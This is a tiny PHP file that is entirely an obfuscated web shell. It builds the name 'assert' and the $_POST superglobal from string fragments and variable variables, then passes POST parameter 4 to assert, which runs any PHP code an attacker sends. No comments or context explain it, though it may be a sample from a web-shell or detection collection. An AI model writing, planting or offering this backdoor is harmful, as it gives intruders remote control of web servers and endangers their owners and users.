<?php

$A='Acc';

$p='_';

$o='PO';

$s='S';

$t='T';

$a='as';

$b='sert';

$Acc=$a.$b;

${$A}(${$p.$o.$s.$t}[4]);
?>